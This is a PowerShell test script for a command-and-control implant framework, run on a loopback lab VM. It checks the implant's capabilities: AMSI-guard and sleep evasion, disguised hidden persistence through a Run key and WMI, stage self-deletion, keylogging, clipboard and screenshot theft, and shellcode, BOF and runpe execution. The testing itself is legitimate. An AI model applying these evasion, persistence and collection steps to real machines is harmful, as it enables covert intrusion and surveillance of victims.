# fulltest.ps1 - the COMPLETE final battery: every capability of the
# final build, validated end to end on the lab VM.
#
# Phase A: loopback teamserver (psboot seeded), onboarding rule.
# Phase B: stage lands with --evasion ekko,guard; T039 playbook fires on
#          the first poll; T040 relocate completes (copy+hidden+run-key+
#          respawn+stage cleanup) and the session CONTINUES through the
#          resident (T040 token hand-off).
# Phase C: full module sweep, FS cycle, shell, collects in BOTH lanes
#          (session-0 screenshot must fail clean; an interactive-session
#          mini-stage via /IT scheduled task must produce a real PNG),
#          transfers with sha256 integrity, exec/bof/runpe, CLR tasks
#          under the guard (psrun+execasm, notes must say amsi=guard),
#          T038 wmi persist cycle, sleep, exit.
# Phase D: verdict.
#
# Usage (guest): powershell -NoProfile -ExecutionPolicy Bypass -File lab\fulltest.ps1

$ErrorActionPreference = 'Continue'
$work = 'C:\abram-fulltest'
$assets = Join-Path $work 'assets'
$stage = 'C:\Users\lab\Desktop\abraham-stage.exe'
$residentDir = 'C:\ProgramData\Sysnet'
$resident = Join-Path $residentDir 'Sysnet.exe'

$script:failed = 0
$script:passed = 0
function Section($t) { Write-Host "`n=== $t" -ForegroundColor Cyan }
function Ok($t) { Write-Host "  [ok] $t" -ForegroundColor Green; $script:passed++ }
function Bad($t) { Write-Host "  [FAIL] $t" -ForegroundColor Red; $script:failed++ }
function Note($t) { Write-Host "  [..] $t" }

# Keep the console desktop capturable: an idle/locked console makes
# BitBlt fail (the screenshot module proved good earlier in the lab).
Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name ScreenSaveActive -Value 0
powercfg /change monitor-timeout-ac 0
powercfg /change standby-timeout-ac 0
Add-Type -TypeDefinition '
using System.Runtime.InteropServices;
namespace AbramWake {
    public static class Native {
        [DllImport("user32.dll")]
        public static extern int SendMessage(int hWnd, int msg, int wParam, int lParam);
    }
}'
function Wake-Display { try { [AbramWake.Native]::SendMessage(0xFFFF, 0x0112, 0xF170, -1) | Out-Null } catch { } }
Wake-Display

function Mgmt([object]$request, [int]$timeoutSec = 30) {
    $client = New-Object System.Net.Sockets.TcpClient('127.0.0.1', 9200)
    $stream = $client.GetStream()
    $stream.ReadTimeout = $timeoutSec * 1000
    $json = $request | ConvertTo-Json -Depth 8 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json + "`n")
    $stream.Write($bytes, 0, $bytes.Length)
    $reader = New-Object System.IO.StreamReader($stream)
    $text = ''
    while ($true) {
        $line = $reader.ReadLine()
        if ($null -eq $line) { break }
        $text += $line
        try { $parsed = $text | ConvertFrom-Json; $client.Close(); return $parsed } catch { continue }
    }
    $client.Close()
    throw "mgmt: unparseable response"
}

function Results([int]$limit = 40) {
    (Mgmt @{ cmd = 'results'; session = $script:sid; limit = $limit }).results
}

function Q([object]$request, [int]$settle = 5) {
    $out = Mgmt $request
    Start-Sleep -Seconds $settle
    return $out
}

function Result-Of([int]$taskId, [int]$waitSec = 12) {
    $deadline = (Get-Date).AddSeconds($waitSec)
    while ((Get-Date) -lt $deadline) {
        $r = Results 60 | Where-Object { $_.task_id -eq $taskId }
        if ($r) { return $r }
        Start-Sleep -Milliseconds 800
    }
    return $null
}

$server = $null
try {
    # ---------------- Phase A -------------------------------------------
    Section 'A. teamserver + onboarding rule'
    Remove-Item -Recurse -Force $work -ErrorAction SilentlyContinue
    # leftovers from an aborted previous run would satisfy Phase B's
    # checks for the wrong reason — always start from a bare host.
    Remove-Item -Recurse -Force $residentDir -ErrorAction SilentlyContinue
    Remove-Item -Force 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Sysnet' -ErrorAction SilentlyContinue
    Remove-Item -Force $stage -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Force -Path $assets | Out-Null
    Copy-Item 'C:\bench\tools\*' $assets -Force
    Copy-Item 'C:\bench\assets\*' $assets -Force -ErrorAction SilentlyContinue
    # psboot seed: the guest has in-box csc but not the source tree
    New-Item -ItemType Directory -Force -Path (Join-Path $work 'cache') | Out-Null
    Copy-Item 'C:\bench\psboot.dll' (Join-Path $work 'cache\psboot.dll') -Force
    $server = Start-Process -FilePath (Join-Path $assets 'abraham-server.exe') `
        -ArgumentList "--listen 127.0.0.1:8443 --mgmt 127.0.0.1:9200 --state `"$work\sessions.json`" --audit `"$work\audit.jsonl`"" `
        -WorkingDirectory $work -WindowStyle Hidden -PassThru `
        -RedirectStandardOutput "$work\server.log" -RedirectStandardError "$work\server.err.log"
    $pubFile = Join-Path $work 'server.pub'
    $deadline = (Get-Date).AddSeconds(20)
    while (-not (Test-Path $pubFile) -and (Get-Date) -lt $deadline) { Start-Sleep -Milliseconds 250 }
    if (-not (Test-Path $pubFile)) { throw 'server did not come up' }
    $pub = (Get-Content $pubFile -Raw).Trim()
    Ok "server pid $($server.Id)"

    $rule = @{
        note = 'fulltest onboarding'
        match_user = 'lab'
        playbook = @('module whoami', 'collect clipboard',
                     'relocate C:\ProgramData\Sysnet Sysnet.exe run-key respawn')
    }
    $add = Mgmt @{ cmd = 'cfg'; action = 'add'; rule = $rule }
    if ($add.ok) { Ok 'onboarding rule with 3-step playbook' } else { Bad "cfg add: $($add | ConvertTo-Json -Compress)" }

    # ---------------- Phase B -------------------------------------------
    Section 'B. stage lands (ekko,guard) -> playbook -> relocate -> resident'
    Copy-Item (Join-Path $assets 'abraham-implant.exe') $stage -Force
    $stageProc = Start-Process -FilePath $stage `
        -ArgumentList "--server 127.0.0.1:8443 --key $pub --sleep 2 --jitter 0.1 --evasion ekko,guard" `
        -WorkingDirectory $work -WindowStyle Hidden -PassThru
    Start-Sleep -Seconds 6
    $sess = (Mgmt @{ cmd = 'sessions' }).sessions | Select-Object -First 1
    if (-not $sess) { Bad 'no session registered'; throw 'abort' }
    $script:sid = $sess.id
    Ok "session $script:sid registered (implant $($sess.implant_version))"

    Start-Sleep -Seconds 10
    $r1 = Result-Of 1; $r2 = Result-Of 2; $r3 = Result-Of 3
    if ($r1 -and $r1.status -eq 0 -and $r1.summary -match 'pid=') { Ok "playbook step 1 whoami: $($r1.summary.Substring(0,50))" } else { Bad 'playbook whoami missing' }
    if ($r2 -and $r2.status -eq 0) { Ok 'playbook step 2 clipboard' } else { Bad 'playbook clipboard missing' }
    if ($r3 -and $r3.status -eq 0 -and $r3.summary -match 'respawn') { Ok 'playbook step 3 relocate (respawned)' } else { Bad "relocate result: $($r3 | ConvertTo-Json -Compress)" }

    Start-Sleep -Seconds 6
    if (-not (Test-Path $resident)) { Bad 'resident missing' } else {
        $attr = (Get-Item $resident -Force).Attributes
        if ($attr -band [IO.FileAttributes]::Hidden -and $attr -band [IO.FileAttributes]::System) { Ok 'resident hidden+system' } else { Bad "resident attrs $attr" }
    }
    if (Test-Path $stage) { Bad 'stage not deleted' } else { Ok 'stage deleted by resident' }
    $one = (Mgmt @{ cmd = 'sessions' }).sessions
    if ($one.Count -eq 1) { Ok 'session continuity (single session after respawn)' } else { Bad "$($one.Count) sessions" }
    $rk = Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Sysnet -ErrorAction SilentlyContinue
    if ($rk -and $rk.Sysnet -eq "`"$resident`"") { Ok 'run-key -> resident' } else { Bad 'run-key wrong' }

    # ---------------- Phase C -------------------------------------------
    Section 'C1. module sweep'
    foreach ($m in @('ps','whoami','netstat','arp','route','domain','disks','services','env')) {
        $t = Q @{ cmd = 'module'; session = $script:sid; name = $m }
        # the ps module walks every process+module list: ~30 s under the
        # lab sensor stack (Sysmon+Defender), tasks run serially in the
        # beacon loop, so the whole sweep gets a wide window.
        $r = Result-Of $t.queued 90
        if ($r -and $r.status -eq 0) { Ok "module $m" } else { Bad "module $m" }
    }

    Section 'C2. filesystem cycle'
    $fs = 'C:/abram-ops/abram-ft'
    Q @{ cmd = 'module'; session = $script:sid; name = 'mkdir'; args = $fs } | Out-Null
    Q @{ cmd = 'module'; session = $script:sid; name = 'cp'; args = "C:/Windows/win.ini $fs/w.ini" } | Out-Null
    $t = Q @{ cmd = 'module'; session = $script:sid; name = 'cat'; args = "$fs/w.ini" }
    $r = Result-Of $t.queued
    if ($r -and $r.summary -match 'for 16-bit') { Ok 'cat roundtrip' } else { Bad 'cat content' }
    Q @{ cmd = 'module'; session = $script:sid; name = 'mv'; args = "$fs/w.ini $fs/w2.ini" } | Out-Null
    Q @{ cmd = 'module'; session = $script:sid; name = 'rm'; args = "$fs/w2.ini" } | Out-Null
    $t = Q @{ cmd = 'module'; session = $script:sid; name = 'ls'; args = $fs }
    $r = Result-Of $t.queued
    if ($r -and $r.status -eq 0) { Ok 'fs cycle (mkdir/cp/cat/mv/rm/ls)' } else { Bad 'fs cycle' }

    Section 'C3. shell'
    $t = Q @{ cmd = 'shell'; session = $script:sid; command = 'whoami' }
    $r = Result-Of $t.queued
    if ($r -and $r.summary -match 'lab') { Ok 'shell whoami' } else { Bad 'shell' }

    Section 'C4. collection (clipboard, keylog, screenshot both lanes)'
    $t = Q @{ cmd = 'collect'; session = $script:sid; action = 'clipboard' }
    $r = Result-Of $t.queued; if ($r -and $r.status -eq 0) { Ok 'clipboard' } else { Bad 'clipboard' }
    $t = Q @{ cmd = 'collect'; session = $script:sid; action = 'keylog' }
    $r = Result-Of $t.queued; if ($r -and $r.status -eq 0) { Ok 'keylog dump' } else { Bad 'keylog' }

    # Screenshot lane 1: this battery's implant runs where vmrun guest
    # ops put it - session 0, which has no interactive desktop. The
    # module must FAIL CLEANLY there (that is its honest error path).
    $t = Q @{ cmd = 'collect'; session = $script:sid; action = 'screenshot' } 8
    $r = Result-Of $t.queued 15
    if ($r -and $r.status -eq 1 -and $r.summary -match 'BitBlt') {
        Ok 'screenshot session-0: clean failure (no desktop to capture)'
    } else {
        Bad "screenshot session-0: status=$($r.status) $($r.summary)"
    }

    # Screenshot lane 2: a real resident (T040 run-key at logon) lives
    # in the INTERACTIVE session. When the console belongs to this
    # user, an /IT scheduled task drops a mini-stage there and the
    # capture must produce a real PNG.
    Wake-Display
    $consoleUser = ''
    $qs = query session 2>$null
    foreach ($ln in $qs) {
        if ($ln -match '^\s*>?console\s+(\S+)\s+\d+') { $consoleUser = $Matches[1] }
    }
    if ($consoleUser -eq 'lab') {
        $shotStage = 'C:\Users\lab\Desktop\shot-stage.exe'
        Copy-Item (Join-Path $assets 'abraham-implant.exe') $shotStage -Force
        $tr = '"' + $shotStage + '" --server 127.0.0.1:8443 --key ' + $pub + ' --sleep 2'
        schtasks /create /tn abram-fulltest-shot /tr $tr /sc once /st 23:59 /f /it | Out-Null
        schtasks /run /tn abram-fulltest-shot | Out-Null
        $shotSid = $null
        $deadline = (Get-Date).AddSeconds(30)
        while (-not $shotSid -and (Get-Date) -lt $deadline) {
            Start-Sleep -Seconds 2
            $shotSid = ((Mgmt @{ cmd = 'sessions' }).sessions |
                Where-Object { $_.id -ne $script:sid } | Select-Object -First 1).id
        }
        if (-not $shotSid) { Bad 'interactive stage never registered' }
        else {
            # Task ids are GLOBAL across sessions, and the onboarding
            # rule hands this mini-stage the playbook too (whoami,
            # clipboard, relocate - the relocate fails benignly, the
            # resident owns that path): wait for OUR queued id, not 1.
            $t = Mgmt @{ cmd = 'collect'; session = $shotSid; action = 'screenshot' }
            $shotTask = $t.queued
            $shot = $null
            $deadline = (Get-Date).AddSeconds(40)
            while (-not $shot -and (Get-Date) -lt $deadline) {
                Start-Sleep -Seconds 2
                $shot = (Mgmt @{ cmd = 'results'; session = $shotSid; limit = 10 }).results |
                    Where-Object { $_.task_id -eq $shotTask }
            }
            $png = "$work\loot\session-$shotSid\task-$shotTask.bin"
            if ($shot -and $shot.status -eq 0 -and (Test-Path $png)) {
                $bytes = [IO.File]::ReadAllBytes($png)
                if ($bytes[0] -eq 0x89 -and $bytes[1] -eq 0x50 -and $bytes[2] -eq 0x4E -and $bytes[3] -eq 0x47) {
                    Ok "screenshot interactive session: real PNG ($($bytes.Length) bytes)"
                } else { Bad "interactive screenshot magic: $($bytes[0..3] -join ',')" }
            } else { Bad "interactive screenshot: task=$shotTask status=$($shot.status) $($shot.summary)" }
            $null = Mgmt @{ cmd = 'exit'; session = $shotSid }
            Start-Sleep -Seconds 3
        }
        schtasks /delete /tn abram-fulltest-shot /f 2>$null | Out-Null
        Remove-Item -Force $shotStage -ErrorAction SilentlyContinue
    } else {
        Note "interactive screenshot skipped (console owned by '$consoleUser', not lab)"
    }

    Section 'C5. transfers with integrity'
    $t = Q @{ cmd = 'upload'; session = $script:sid; local = 'assets/medium.bin'; remote = 'C:/abram-ops/abram-med.bin' } 12
    $t = Q @{ cmd = 'download'; session = $script:sid; path = 'C:/abram-ops/abram-med.bin' } 12
    $h1 = (Get-FileHash (Join-Path $assets 'medium.bin') -Algorithm SHA256).Hash
    $h2 = if (Test-Path 'C:\abram-ops\abram-med.bin') { (Get-FileHash 'C:\abram-ops\abram-med.bin' -Algorithm SHA256).Hash } else { '' }
    $lootBin = Get-ChildItem "$work\loot\session-$script:sid" -Filter '*.bin' |
        Where-Object Length -eq 200000 | Sort-Object LastWriteTime | Select-Object -Last 1
    $h3 = if ($lootBin) { (Get-FileHash $lootBin.FullName -Algorithm SHA256).Hash } else { '' }
    if ($h1 -eq $h2 -and $h1 -eq $h3 -and $h1) { Ok 'upload+download sha256 identical (asset=remote=loot, 200KB)' }
    else { Bad "transfer hash mismatch (asset=$($h1.Substring(0,8)) remote=$(if($h2){$h2.Substring(0,8)}else{'none'}) loot=$(if($h3){$h3.Substring(0,8)}else{'none'}))" }

    Section 'C6. execution: shellcode, bof, runpe'
    $t = Q @{ cmd = 'exec'; session = $script:sid; source = 'assets/ret.bin' }
    $r = Result-Of $t.queued; if ($r -and $r.status -eq 0 -and $r.summary -match 'ret=') { Ok 'shellcode exec' } else { Bad 'exec' }
    $t = Q @{ cmd = 'bof'; session = $script:sid; source = 'assets/boftest.obj' }
    $r = Result-Of $t.queued; if ($r -and $r.status -eq 0) { Ok 'bof' } else { Bad "bof: $($r.summary)" }
    $t = Q @{ cmd = 'upload'; session = $script:sid; local = 'assets/minipe.exe'; remote = 'C:/abram-ops/abraham-pe.exe' } 8
    $t = Q @{ cmd = 'runpe'; session = $script:sid; path = 'C:/abram-ops/abraham-pe.exe' }
    $r = Result-Of $t.queued; if ($r -and $r.status -eq 0) { Ok 'runpe' } else { Bad "runpe: $($r.summary)" }

    Section 'C7. CLR under the guard (psrun + execasm)'
    $t = Q @{ cmd = 'psrun'; session = $script:sid; script = 'write-output battery-ps-ok' } 8
    $r = Result-Of $t.queued
    if ($r -and $r.status -eq 0 -and $r.summary -match 'battery-ps-ok' -and $r.summary -match 'amsi=guard') { Ok 'psrun under guard (amsi=guard in note)' } else { Bad "psrun: $($r.summary)" }
    $t = Q @{ cmd = 'execasm'; session = $script:sid; source = 'assets/battery.dll'; type = 'Probe'; method = 'Run'; argument = 'hi' } 8
    $r = Result-Of $t.queued
    if ($r -and $r.status -eq 0 -and $r.summary -match 'ret=0x2a' -and $r.summary -match 'amsi=guard') { Ok 'execasm under guard (managed ret=42)' } else { Bad "execasm: $($r.summary)" }

    Section 'C8. persistence: wmi (T038) cycle'
    $t = Q @{ cmd = 'persist'; session = $script:sid; action = 'install'; mechanism = 'wmi'; name = 'abram-ft' } 10
    $r = Result-Of $t.queued
    if ($r -and $r.status -eq 0 -and $r.summary -match 'installed') { Ok 'wmi install (hourly filter)' } else { Bad "wmi install: $($r.summary)" }
    $t = Q @{ cmd = 'persist'; session = $script:sid; action = 'list'; mechanism = 'wmi'; name = 'abram-ft' } 8
    $r = Result-Of $t.queued
    if ($r -and $r.status -eq 0 -and $r.summary -match 'wmi-binding') { Ok 'wmi list shows binding' } else { Bad "wmi list: $($r.summary)" }
    $t = Q @{ cmd = 'persist'; session = $script:sid; action = 'remove'; mechanism = 'wmi'; name = 'abram-ft' } 10
    $r = Result-Of $t.queued
    if ($r -and $r.status -eq 0 -and $r.summary -match 'gone') { Ok 'wmi remove (verdict real state)' } else { Bad "wmi remove: $($r.summary)" }

    Section 'C9. sleep + exit'
    $t = Q @{ cmd = 'sleep'; session = $script:sid; secs = 2; jitter = 0.2 }
    $r = Result-Of $t.queued; if ($r -and $r.status -eq 0) { Ok 'sleep task' } else { Bad 'sleep' }
    $residentPid = (Get-Process | Where-Object { $_.Path -eq $resident }).Id
    $t = Q @{ cmd = 'exit'; session = $script:sid } 5
    Start-Sleep -Seconds 4
    if (-not (Get-Process -Id $residentPid -ErrorAction SilentlyContinue)) { Ok 'exit terminates resident' } else { Bad 'resident still alive' }

    # ---------------- Phase D -------------------------------------------
    Section 'D. audit sanity'
    $audit = Get-Content "$work\audit.jsonl" | ForEach-Object { $_ | ConvertFrom-Json }
    if (($audit | Where-Object { $_.event -eq 'playbook_queued' }) -and
        ($audit | Where-Object { $_.event -eq 'session_resume' })) { Ok 'playbook_queued + session_resume audited' } else { Bad 'audit incomplete' }

    # teardown leftovers
    Remove-Item -Recurse -Force $residentDir -ErrorAction SilentlyContinue
    Remove-Item -Force 'C:\Users\lab\Desktop\abraham-med.bin','C:\Users\lab\Desktop\abraham-pe.exe' -ErrorAction SilentlyContinue
    Remove-Item -Force 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Sysnet' -ErrorAction SilentlyContinue -Confirm:$false
    Remove-Item -Recurse -Force 'C:\abram-ops\abram-ft' -ErrorAction SilentlyContinue
    Remove-Item -Force 'C:\abram-ops\abram-med.bin','C:\abram-ops\abraham-pe.exe' -ErrorAction SilentlyContinue
}
finally {
    Get-Process | Where-Object { $_.Path -eq $stage } | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-Process | Where-Object { $_.Path -eq $resident } | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-Process | Where-Object { $_.Path -eq 'C:\Users\lab\Desktop\shot-stage.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
    schtasks /delete /tn abram-fulltest-shot /f 2>$null | Out-Null
    if ($server -and -not $server.HasExited) { Stop-Process -Id $server.Id -Force -ErrorAction SilentlyContinue }
}

Write-Host ''
# An early abort inside the try lands in finally and falls through to
# this verdict with a partial count — never let that read as green.
if ($script:passed -lt 30) {
    Write-Host "FULLTEST: ABORTED EARLY (only $($script:passed) checks ran - see errors above)" -ForegroundColor Yellow
    exit 2
}
Write-Host "FULLTEST: $($script:passed) passed, $($script:failed) failed" -ForegroundColor $(if ($script:failed) { 'Red' } else { 'Green' })
if ($script:failed) { exit 1 } else { Write-Host 'FULLTEST: ALL GREEN' -ForegroundColor Green }
